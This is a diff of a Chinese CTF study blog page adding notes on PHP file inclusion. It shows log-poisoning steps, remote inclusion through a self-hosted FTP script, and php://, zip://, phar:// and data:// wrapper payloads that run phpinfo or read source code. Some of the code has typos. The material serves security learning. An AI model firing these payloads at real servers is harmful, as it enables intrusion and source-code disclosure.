@@ -38,7 +38,7 @@
 <meta property="og:image" content="https://blog.overlordzj.cn/images/PHP%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/image-20240927012701739.png">
 <meta property="og:image" content="https://blog.overlordzj.cn/images/PHP%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/image-20240927013555117.png">
 <meta property="article:published_time" content="2024-09-25T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-09-26T18:22:43.258Z">
+<meta property="article:modified_time" content="2024-09-27T06:33:21.110Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="data">
@@ -584,15 +584,15 @@
 
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">23</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">25</div>
         <div class="label text-third-text-color text-sm">Tags</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">23</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">24</div>
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">56</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">57</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -646,8 +646,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-09-27 02:22:43</span>
-            <span class="mobile">2024-09-27 02:22:43</span>
+            <span class="desktop">2024-09-27 14:33:21</span>
+            <span class="mobile">2024-09-27 14:33:21</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -713,12 +713,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.4k Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2.4k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>5 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>9 Mins</span>
         </span>
     
     
@@ -881,12 +881,85 @@
 <blockquote>
 <p>这里的本地是对于服务器的本地，不是我们自己的电脑</p>
 </blockquote>
+<p>通过传入参数来访问本地文件，&#x2F;?file&#x3D;flag.php</p>
+<p><strong>有价值的文件路径</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/log/auth.log	#SSH 日志</span><br><span class="line"></span><br><span class="line">/flag	#CTF中的flag路径</span><br><span class="line"></span><br><span class="line">/var/log/apache2/access.log	#Apache日志</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h5><ol>
+<li><p>利用文件上传漏洞，上传一句话执行文件并访问（例如在图片里插入phpinfo代码，将图片上传后访问图片地址）</p>
+<p>利用中间件日志文件，请求的时候将请求的payload写作可执行代码（例如<code>?file=&lt;? php phpinfo();?&gt;</code>），这时候这串指令以及保存到日志文件中了，访问Apache日志即可执行代码</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/apache2/access.log</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>利用SSH日志文件，通过SSH连接到目标服务器</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &#x27;&lt;? php phpinfo();?&gt;&#x27;@HOST</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>执行后文件包含访问服务器</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tail</span> -n 6 /var/log/auth.log</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<p><strong>若只能包含.php文件则要用到伪协议编码输出文件</strong></p>
 <h4 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h4><p><strong>Remote File Inclusion ：RFI</strong></p>
 <p> 所包含的文件为远程文件</p>
 <blockquote>
 <p>这里的远程是对于本地的，也就是相对于服务器以外的远程文件</p>
 </blockquote>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/xhds/p/12587249.html" >PHP中的变量覆盖漏洞 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h5 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h5><p>服务器的php配置项中<code>allow_url_include=On</code></p>
+<h5 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h5><p>可以利用的协议有HTTP、FTP、SMB、Webdav</p>
+<p><strong>HTTP远程文件包含</strong></p>
+<p>在自己或者其他的远程开启HTTP服务的服务器上，写入需要执行的PHP文件，传入参数<code>?file=http://服务器IP/test.txt</code></p>
+<p><strong>FTP远程文件包含</strong></p>
+<p>在自己或者其他的远程开启FTP服务的服务器上，写入需要执行的PHP文件，传入参数<code>?file=ftp://服务器IP/1</code></p>
+
+  <div class="note p-4 mb-4 rounded-small red">
+    <p>这里需要先用Python启动FTP服务（因人而异）</p>
+
+  </div>
+
+<p>提供一个脚本</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyftpdlib.handlers <span class="keyword">import</span> FTPHandler</span><br><span class="line"><span class="keyword">from</span> pyftpdlib.servers <span class="keyword">import</span> FTPServer</span><br><span class="line"><span class="keyword">from</span> pyftpdlib.authorizers <span class="keyword">import</span> DummyAuthorizer</span><br><span class="line">authorizer=DummyAuthorizer()</span><br><span class="line">handler=FTPHandler</span><br><span class="line">handler.authorizer=authorizer</span><br><span class="line">authorizer.add_anonymous(<span class="string">&#x27;/tmp&#x27;</span>)	<span class="comment">#FTP目录</span></span><br><span class="line">server-FTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">21</span>),handler)</span><br><span class="line">server.serve_forerver()</span><br></pre></td></tr></table></figure></div>
+
+<p>然后再<code>/tmp</code>目录中编写php代码文件</p>
+<h3 id="PHP常见伪协议及其用法"><a href="#PHP常见伪协议及其用法" class="headerlink" title="PHP常见伪协议及其用法"></a>PHP常见伪协议及其用法</h3><h4 id="1、php-input"><a href="#1、php-input" class="headerlink" title="1、php:&#x2F;&#x2F;input"></a>1、php:&#x2F;&#x2F;input</h4><p>可以获取POST的数据流</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">条件：</span><br><span class="line">allow_url_include=On</span><br><span class="line">allow_url_fopen-Off/On</span><br><span class="line"></span><br><span class="line">POC:</span><br><span class="line">file =php://input</span><br><span class="line">POST:phpinfo();</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="2、php-filter"><a href="#2、php-filter" class="headerlink" title="2、php:&#x2F;&#x2F;filter"></a>2、php:&#x2F;&#x2F;filter</h4><p>可以获取指定文件的源码，但是当他与包含函数结合是，php:&#x2F;&#x2F;filter流会被当做php文件执行。所以我们一般对其进行编码，让其不执行，从而导致任意文件读取。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">条件：</span><br><span class="line">allow_url_fopen=Off/On</span><br><span class="line">allow_url_include=Off/On</span><br><span class="line"></span><br><span class="line">POC:</span><br><span class="line">?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>过滤器介绍</strong></p>
+<p>在读取文件的时候当解析为php文件时会停止解析被保护，而过滤器可以通过编码将其以编码的形式暴露出来</p>
+<p><strong>Base64过滤器</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></div>
+
+<p>去除html和php标记过滤器</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/string.strip_tags/resource=index.php</span><br></pre></td></tr></table></figure></div>
+
+<p>将内容转为大写</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/string.toupper/resource=index.php</span><br></pre></td></tr></table></figure></div>
+
+<p>将内容转为小写</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/string.tolower/resource=index.php</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>对字符串执行rot13变换</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=string.rot13/resource=index.php</span><br></pre></td></tr></table></figure></div>
+
+<p>将字符串转化为8-bit字符串</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.quoted-printable-encode/resource=index.php</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>对字符串从UTF-8到UTF-7转换</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.utf-8.utf-7/resource=index.php</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="3、zip"><a href="#3、zip" class="headerlink" title="3、zip:&#x2F;&#x2F;"></a>3、zip:&#x2F;&#x2F;</h4><p>可以访问压缩包里的文件。当他与包含函数结合时，zip:&#x2F;&#x2F;流会被当做php文件执行。<br>从而实现任意文件执行。<br>同类型的还有：zlib:&#x2F;&#x2F; 和bzip2:&#x2F;&#x2F;</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">条件：</span><br><span class="line">必须要zip压缩包（后缀无所谓，文件格式是zip就行）。</span><br><span class="line">allow_url_fopen=Off/On</span><br><span class="line">allow_url_include=Off/On</span><br><span class="line">php &gt;=5.2</span><br><span class="line"></span><br><span class="line">POC:</span><br><span class="line">zip://[压缩包绝对路径]#[压缩包内的文件]</span><br><span class="line">?file=zip://D:\zip.zip%23phpinfo.txt</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="4、phar"><a href="#4、phar" class="headerlink" title="4、phar:&#x2F;&#x2F;"></a>4、phar:&#x2F;&#x2F;</h4><p>和zip:&#x2F;&#x2F;类似<br>绝对路径和相对路径都可以</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">条件：</span><br><span class="line">必须要zip压缩包（后缀无所谓，文件格式是zip就行）。</span><br><span class="line">allow_url_fopen=Off/On</span><br><span class="line">allow_url_include=Off/On</span><br><span class="line">php &gt;=5.2</span><br><span class="line"></span><br><span class="line">POC:</span><br><span class="line">zip://[压缩包绝对路径]#[压缩包内的文件]</span><br><span class="line">?file=zip://D:\zip.zip/phpinfo.php(与zip://不同之处在于一个是# ，一个是/)</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="5、data"><a href="#5、data" class="headerlink" title="5、data:&#x2F;&#x2F;"></a>5、data:&#x2F;&#x2F;</h4><p>同样类似于php:&#x2F;&#x2F;input</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">条件：</span><br><span class="line">allow_url_fopen=On</span><br><span class="line">allow_url_include=On</span><br><span class="line"></span><br><span class="line">POC:</span><br><span class="line">?file=data://,&lt;?php phpinfo();</span><br><span class="line">?file=data://text/plain,&lt;php phpinfo();</span><br><span class="line">?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line">?file=data:text/plain,&lt;php phpinfo();</span><br><span class="line">?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="PHP代码执行漏洞"><a href="#PHP代码执行漏洞" class="headerlink" title="PHP代码执行漏洞"></a>PHP代码执行漏洞</h3><h4 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><h5 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h5><p>代码结尾用；结束</p>
+<h5 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h5><p>代码结尾不需要；结束</p>
+<h5 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h5><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/xhds/p/12587249.html" >PHP中的变量覆盖漏洞 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/yao_xin_de_yuan/article/details/108326427" >五种常见的php伪协议 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 
         </div>
 
@@ -901,7 +974,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-09-27 02:22:43
+                    :</strong> 2024-09-27 14:33:21
             </li>
         
         <li>
@@ -947,30 +1020,30 @@
     <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
      <i aria-hidden="true"></i><span>看看这些文章吧( ૢ⁼̴̤̆ ꇴ ⁼̴̤̆ ૢ)~ෆ</span>
     </div>
-    <div class="recommended-article-group"><a class="recommended-article-item" href="/2024/09/10/C语言/基础部分/遗漏问题解答/" title="关于C语言学习的部分遗漏问题解答" rel="bookmark">
-  <img src="/images/wallhaven-wqery6-light.webp" alt="关于C语言学习的部分遗漏问题解答" class="!max-w-none">
-  <span class="title">关于C语言学习的部分遗漏问题解答</span>
-</a><a class="recommended-article-item" href="/2024/09/14/ctf/writeup/web/buuctf/[BJDCTF2020]ZJCTF-不过如此/" title="BJDCTF2020 ZJCTF，不过如此*" rel="bookmark">
+    <div class="recommended-article-group"><a class="recommended-article-item" href="/2024/09/14/ctf/writeup/web/buuctf/[BJDCTF2020]ZJCTF-不过如此/" title="BJDCTF2020 ZJCTF，不过如此*" rel="bookmark">
   <img src="/images/wallhaven-wqery6-light.webp" alt="BJDCTF2020 ZJCTF，不过如此*" class="!max-w-none">
   <span class="title">BJDCTF2020 ZJCTF，不过如此*</span>
-</a><a class="recommended-article-item" href="/2024/09/23/ctf/data/misc/流量分析/" title="流量分析" rel="bookmark">
-  <img src="/images/wallhaven-wqery6-light.webp" alt="流量分析" class="!max-w-none">
-  <span class="title">流量分析</span>
+</a><a class="recommended-article-item" href="/2024/09/13/ctf/writeup/web/buuctf/[BJDCTF2020]Mark-loves-cat/" title="BJDCTF2020-Mark-loves-cat*" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="BJDCTF2020-Mark-loves-cat*" class="!max-w-none">
+  <span class="title">BJDCTF2020-Mark-loves-cat*</span>
+</a><a class="recommended-article-item" href="/2024/09/10/C语言/基础部分/遗漏问题解答/" title="关于C语言学习的部分遗漏问题解答" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="关于C语言学习的部分遗漏问题解答" class="!max-w-none">
+  <span class="title">关于C语言学习的部分遗漏问题解答</span>
 </a></div>
    </div>
    <div class="recommended-mobile">
    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
      <i aria-hidden="true"></i><span>看看这些文章吧( ૢ⁼̴̤̆ ꇴ ⁼̴̤̆ ૢ)~ෆ</span>
    </div>
-   <div class="recommended-article-group"><a class="recommended-article-item" href="/2024/09/10/C语言/基础部分/遗漏问题解答/" title="关于C语言学习的部分遗漏问题解答" rel="bookmark">
-  <img src="/images/wallhaven-wqery6-light.webp" alt="关于C语言学习的部分遗漏问题解答" class="!max-w-none">
-  <span class="title">关于C语言学习的部分遗漏问题解答</span>
-</a><a class="recommended-article-item" href="/2024/09/14/ctf/writeup/web/buuctf/[BJDCTF2020]ZJCTF-不过如此/" title="BJDCTF2020 ZJCTF，不过如此*" rel="bookmark">
+   <div class="recommended-article-group"><a class="recommended-article-item" href="/2024/09/14/ctf/writeup/web/buuctf/[BJDCTF2020]ZJCTF-不过如此/" title="BJDCTF2020 ZJCTF，不过如此*" rel="bookmark">
   <img src="/images/wallhaven-wqery6-light.webp" alt="BJDCTF2020 ZJCTF，不过如此*" class="!max-w-none">
   <span class="title">BJDCTF2020 ZJCTF，不过如此*</span>
-</a><a class="recommended-article-item" href="/2024/09/23/ctf/data/misc/流量分析/" title="流量分析" rel="bookmark">
-  <img src="/images/wallhaven-wqery6-light.webp" alt="流量分析" class="!max-w-none">
-  <span class="title">流量分析</span>
+</a><a class="recommended-article-item" href="/2024/09/13/ctf/writeup/web/buuctf/[BJDCTF2020]Mark-loves-cat/" title="BJDCTF2020-Mark-loves-cat*" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="BJDCTF2020-Mark-loves-cat*" class="!max-w-none">
+  <span class="title">BJDCTF2020-Mark-loves-cat*</span>
+</a><a class="recommended-article-item" href="/2024/09/10/C语言/基础部分/遗漏问题解答/" title="关于C语言学习的部分遗漏问题解答" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="关于C语言学习的部分遗漏问题解答" class="!max-w-none">
+  <span class="title">关于C语言学习的部分遗漏问题解答</span>
 </a></div>
    </div>
   </div>
@@ -981,13 +1054,13 @@
                     <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="prev"
                         rel="prev"
-                        href="/2024/09/26/ctf/data/web/HTTP%E7%9B%B8%E5%85%B3%E5%9F%BA%E7%A1%80%E8%B5%84%E6%96%99/"
+                        href="/2024/09/26/ctf/data/reverse/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/"
                         >
                             <span class="left arrow-icon flex justify-center items-center">
                                 <i class="fa-solid fa-chevron-left"></i>
                             </span>
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">HTTP相关基础资料</span>
+                                <span class="post-nav-title-item">逆向分析基础</span>
                                 <span class="post-nav-item">Prev posts</span>
                             </span>
                         </a>
@@ -997,10 +1070,10 @@
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="next"
                         rel="next"
-                        href="/2024/09/26/ctf/data/web/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"
+                        href="/2024/09/26/ctf/writeup/misc/buuctf/%5Bvolatility%E4%BB%8B%E7%BB%8D%5D%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"
                         >
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">web信息泄露</span>
+                                <span class="post-nav-title-item">volatility介绍-内存取证*</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
@@ -1065,7 +1138,7 @@
     <div class="post-toc">
         <div class="toc-title">On this page</div>
         <div class="page-title">PHP相关知识</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="nav-text">PHP相关知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%89%B9%E5%BE%81"><span class="nav-text">PHP的弱类型特征</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%BA%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%BC%B1%E7%B1%BB%E5%9E%8B"><span class="nav-text">强类型与弱类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">弱类型漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MD5%E3%80%81HASH%E5%8A%A0%E5%AF%86%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">MD5、HASH加密相关漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6"><span class="nav-text">漏洞条件</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#MD5"><span class="nav-text">MD5</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MD4"><span class="nav-text">MD4</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SHA1"><span class="nav-text">SHA1</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">PHP变量覆盖漏洞*</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-text">PHP变量覆盖</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="nav-text">变量覆盖的方式</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-text">PHP文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="nav-text">常见文件包含函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-text">本地文件包含漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-text">远程文件包含漏洞</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-text">参考文章</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="nav-text">PHP相关知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%89%B9%E5%BE%81"><span class="nav-text">PHP的弱类型特征</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%BA%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%BC%B1%E7%B1%BB%E5%9E%8B"><span class="nav-text">强类型与弱类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">弱类型漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MD5%E3%80%81HASH%E5%8A%A0%E5%AF%86%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">MD5、HASH加密相关漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6"><span class="nav-text">漏洞条件</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#MD5"><span class="nav-text">MD5</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MD4"><span class="nav-text">MD4</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SHA1"><span class="nav-text">SHA1</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">PHP变量覆盖漏洞*</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-text">PHP变量覆盖</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="nav-text">变量覆盖的方式</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-text">PHP文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="nav-text">常见文件包含函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-text">本地文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-text">利用方法</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-text">远程文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90"><span class="nav-text">利用前提</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-1"><span class="nav-text">利用方法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP%E5%B8%B8%E8%A7%81%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E7%94%A8%E6%B3%95"><span class="nav-text">PHP常见伪协议及其用法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81php-input"><span class="nav-text">1、php:&#x2F;&#x2F;input</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" 